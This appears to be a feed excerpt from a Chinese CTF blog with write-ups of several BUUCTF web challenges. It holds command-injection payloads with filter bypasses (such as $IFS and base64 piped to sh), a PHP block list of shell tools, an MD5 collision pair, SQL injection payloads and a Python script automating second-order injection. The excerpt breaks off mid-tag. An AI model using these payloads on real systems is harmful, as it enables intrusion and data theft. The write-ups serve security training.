&lt;li&gt;[GXYCTF2019]BabySQli&lt;/li&gt;
&lt;li&gt;[安洵杯 2019]easy_serialize_php&lt;/li&gt;
&lt;li&gt;[ACTF2020 新生赛]Include&lt;/li&gt;
&lt;li&gt;[SUCTF 2019]EasyWeb&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（四）</title>
    <link href="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-02-15T08:35:55.000Z</published>
    <updated>2020-06-07T06:28:28.917Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[极客大挑战 2019]BuyFlag</li><li>[GXYCTF2019]Ping Ping Ping</li><li>[安洵杯 2019]easy_web</li><li>[极客大挑战 2019]BabySQL</li><li>[SWPU2019]Web1</li><li>[ASIS 2019]Unicorn shop</li><li>[CISCN2019 华北赛区 Day1 Web2]ikun</li><li>[WesternCTF2018]shrine</li></ul><a id="more"></a><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215164317.png" alt=""></p><p>打开界面看到<code>PAYFLAG</code>解密</p><p>看源代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215164350.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165238.png" alt=""></p><p>提示我们不是<code>Cuit&#39;s Student</code>，看到<code>Cookies</code>修改为1即可</p><p>接下来<code>is_numberic</code>的限制很好绕过，直接<code>404a</code>即可绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165451.png" alt=""></p><p><code>money</code>这里输入<code>100000000</code>会提示长度过长，输入少个0会提示钱太少</p><p>这里响应包看到<code>PHP/5.3.3</code>,推测后台是通过<code>strcmp</code>来进行比较，直接数组绕过即可~</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165749.png" alt=""></p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>这道题是<code>Ping</code>的题</p><p>但是这破题过滤了<code>&gt;、flag、空格、{、}、(、)、？、*、、、/</code>一堆东西</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>坑了一小时，翻了翻<code>Linux</code>命令，找到了<code>tar</code>压缩命令</p><p>这里空格可以通过<code>$IFS</code>绕过</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$9</span></span></span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="meta">%</span><span class="bash">20</span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=;tar$IFS-zcvf$IFS.tar.gz$IFS.</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182157.png" alt=""></p><p>然后当前目录下会生成一个叫<code>.tar.gz</code>的压缩包</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182236.png" alt=""></p><p>注意这里<code>ls</code>需要加<code>-a</code>参数才能看到隐藏文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182327.png" alt=""></p><p>下载下来即可读到<code>flag</code></p><h2 id="大佬们的做法"><a href="#大佬们的做法" class="headerlink" title="大佬们的做法"></a>大佬们的做法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php        反斜线绕过</span><br><span class="line">cat y1”ng.php        两个单引号绕过</span><br><span class="line">echo “Y2F0IHkxbmcucGhw” | base64 -d | bash       base64编码绕过(引号可以去掉)</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bash       hex编码绕过(引号可以去掉)</span><br><span class="line">cat y1[n]g.php       用[]匹配</span><br><span class="line">cat y1n*       用*匹配任意</span><br><span class="line">内联执行</span><br><span class="line">bash 被过滤可以用 sh 代替</span><br><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br></pre></td></tr></table></figure><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215183616.png" alt=""></p><h3 id="sh-base64"><a href="#sh-base64" class="headerlink" title="sh+base64"></a>sh+base64</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215183805.png" alt=""></p><h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>这个我一开始试过，但是用的<code>$IFS</code>而不是<code>$IFS$9</code>，导致没读到<code>flag.php</code>，浪费了大半天时间，真是遗憾</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215184346.png" alt=""></p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p><a href="http://da2a5d41-03de-4883-b85d-3fc61cd6d0cf.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=" target="_blank" rel="noopener">http://da2a5d41-03de-4883-b85d-3fc61cd6d0cf.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204355.png" alt=""></p><p>看到<code>img</code>参数先解码</p><p>经过两次<code>base64</code>解码以及十六进制转字符串</p><p>得到<code>555.jpg</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204906.png" alt=""></p><p>推测应该存在任意文件读取漏洞</p><p>这里构造<code>index.php</code>转十六进制然后两次<code>base64</code>编码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204816.png" alt=""></p><p>然后把编码结果传到<code>img</code>参数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205013.png" alt=""></p><p>解码得到<code>index.php</code>的源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>前半部分图片读取那部分是幌子，真正起作用部分是下面这部分</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>POST</code>的<code>md5</code>比较这一块是<code>MD5碰撞</code>，这里直接给出值</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure><p>碰撞通过后，这里对命令进行了过滤，这里有两种解法</p><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>Linux sort命令用于将文本文件内容加以排序。</p><p>sort可针对文本文件的内容，以行为单位来排序。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205545.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205606.png" alt=""></p><h2 id="过滤不严"><a href="#过滤不严" class="headerlink" title="\过滤不严"></a>\过滤不严</h2><p>linux下在<code>shell</code>中可通过<code>ca\t</code>的形式连接命令</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205936.png" alt=""></p><p>而<code>\</code>不在那个过滤中，成功绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215210012.png" alt=""></p><h2 id="tar压缩绕过"><a href="#tar压缩绕过" class="headerlink" title="tar压缩绕过"></a>tar压缩绕过</h2><p>这里正则里没过滤<code>tar</code>，但是过滤了<code>-</code>，但不影响参数的使用</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/index.php?cmd=tar%<span class="number">20</span>zcvf%<span class="number">20</span>a.tar.gz%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216142425.png" alt=""></p><p>然后访问<code>/a.tar.gz</code>下载得到<code>flag</code>压缩包解压得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216142400.png" alt=""></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>还是羽哥哥出的注入题</p><p>先放到<code>Sqlmap</code>看了一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151024.png" alt=""></p><h2 id="PROCEDURE-ANALYSE注入"><a href="#PROCEDURE-ANALYSE注入" class="headerlink" title="PROCEDURE ANALYSE注入"></a>PROCEDURE ANALYSE注入</h2><p>可能存在<code>PROCEDURE ANALYSE</code>注入</p><p><a href="https://www.freebuf.com/column/150475.html" target="_blank" rel="noopener">CTF中的SQL注入 | 常规获取数据类</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151514.png" alt=""></p><p><a href="https://www.cnblogs.com/peterpan0707007/p/7536126.html" target="_blank" rel="noopener">【总结】MYSQL注入</a></p><p><a href="https://www.freebuf.com/articles/web/57528.html" target="_blank" rel="noopener">技术分享：Mysql注入点在limit关键字后面的利用方法</a></p><p><a href="https://blog.csdn.net/ty_hf/article/details/54895466" target="_blank" rel="noopener">Mysql优化-Procedure_Analyse优化表结构</a></p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">9498</span>b5e3-<span class="number">3005</span>-<span class="number">4623</span>-ab8e-<span class="number">2</span>b58b325b780.node3.buuoj.cn/check.php?username=<span class="number">1</span>' <span class="keyword">PROCEDURE</span> <span class="title">ANALYSE</span>(EXTRACTVALUE(1,CONCAT(0x7e,database())),1)<span class="comment">-- -&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151717.png" alt=""></p><p>得到数据库名，证明注入可行</p><p><strong>以上提供思路，剩下的我大半天也没注出表名……</strong></p><h2 id="正常报错注入"><a href="#正常报错注入" class="headerlink" title="正常报错注入"></a>正常报错注入</h2><p>这里把关键字全部单次过滤了，双写绕过即可</p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(selselectect database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216163936.png" alt=""></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seselectlect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216164047.png" alt=""></p><h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seselectlect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216164233.png" alt=""></p><p>经过测试得知<code>falg</code>在<code>password</code>字段</p><h3 id="爆flag"><a href="#爆flag" class="headerlink" title="爆flag"></a>爆<code>flag</code></h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(left((seselectlect passwoorrd frfromom geek.b4bsql limit <span class="number">7</span>,<span class="number">1</span>),<span class="number">31</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216170026.png" alt=""></p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">http://<span class="number">9498b5e3</span>-<span class="number">3005-4623</span>-ab8e-<span class="number">2</span>b58b<span class="number">325b780</span>.node3.buuoj.cn/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(right((seselectlect passwoorrd frfromom geek.b4bsql limit <span class="number">7</span>,<span class="number">1</span>),<span class="number">31</span>)),<span class="number">0</span>x7e),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到后半段</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216170151.png" alt=""></p><p>组合一下得到<code>flag</code></p><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>这道题我看到用户名一开始以为是用户名二次注入</p><p>测试了半天发现不是</p><p>最后发现注入点是在广告申请处的标题那里</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216203323.png" alt=""></p><p>申请完之后在广告详情处可以看到触发注入结果了（这也算是二次注入？？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216203440.png" alt=""></p><p>那么这里可以在广告申请这里来进行注入，为了方便，写了个脚本辅助注入</p><p>比较坑爹的是<code>payload</code>即广告内容不能重复，即一个payload只能用一次。。。</p><p>这里附上辅助脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line">all_url = <span class="string">"http://4e4b49d5-0057-4ae6-b34e-71e0575d34d2.node3.buuoj.cn/"</span></span><br><span class="line">register_url = all_url+<span class="string">"register.php"</span></span><br><span class="line">login_url = all_url+<span class="string">"login.php"</span></span><br><span class="line">ad_url = all_url+<span class="string">"addads.php"</span></span><br><span class="line">index_url = all_url+<span class="string">"index.php"</span></span><br><span class="line">user = str(random.random())</span><br><span class="line">register_data = &#123;</span><br><span class="line"><span class="string">'username'</span>: user,</span><br><span class="line"><span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'register'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=register_url,data=register_data)</span><br><span class="line">login_data = &#123;</span><br><span class="line"><span class="string">'username'</span>: user,</span><br><span class="line"><span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'login'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=login_url,data=login_data)</span><br><span class="line"><span class="keyword">for</span> id <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">99999</span>):</span><br><span class="line">payload = input(<span class="string">"Payload:"</span>)</span><br><span class="line">preg_0 = re.compile(<span class="string">"待管理确认&lt;/td&gt;&lt;td&gt;&lt;button type='button'&gt;&lt;a href='(.*?)'&gt;"</span>)</span><br><span class="line">ad_data = &#123;</span><br><span class="line"><span class="string">'title'</span>: payload,</span><br><span class="line"><span class="string">'content'</span>: <span class="string">'3213'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'add'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">state = session.post(url=ad_url,data=ad_data).text</span><br><span class="line">print(<span class="string">"申请状态:"</span>+state)</span><br><span class="line">index = session.get(url=index_url).text</span><br><span class="line">detail_url = all_url+preg_0.findall(index)[<span class="number">-1</span>]</span><br><span class="line">s = session.get(url=detail_url).text</span><br><span class="line">preg_1 = re.compile(<span class="string">"&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;"</span>)</span><br><span class="line">show = preg_1.findall(s)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"回显:"</span>+show)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>通过这个脚本可以看到过滤了<code>空格、or、floor、updatexml、extractvalue、exp</code>等字符</p><p>空格过滤可通过<code>/**/</code>绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204023.png" alt=""></p><p>过滤了<code>or</code>就不能从<code>information_schema</code>表查到信息了，可以依靠子查询</p><p>判断回显点可以通过<code>union/**/select1,2,3,4,5.......</code>来不断尝试</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204803.png" alt=""></p><p>然后得到数据库名</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204904.png" alt=""></p><p>既然不能用<code>information_schema</code>库来查表名列名，那么只能用子查询了</p><p>这里修改了一下脚本，自己在<code>2</code>号注入点修改数据即可</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"-1'union/**/select/**/1,&#123;&#125;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&#123;&#125;"</span>.<span class="built_in">format</span>(<span class="built_in">input</span>(<span class="string">"Payload:"</span>),str(<span class="built_in">random</span>.<span class="built_in">random</span>()))</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216205651.png" alt=""></p><p>接下来是获取表名</p><p>师傅们的做法中用到了<code>sys.schema_auto_increment_columns</code>来获取表名</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217130521.png" alt=""></p><p>但这道题好像没有<code>sys.schema_auto_increment_columns</code>这个表</p><p>还有这个表也可以<code>schema_index_statistics</code>，但这道题用不了哈哈</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217130755.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217131754.png" 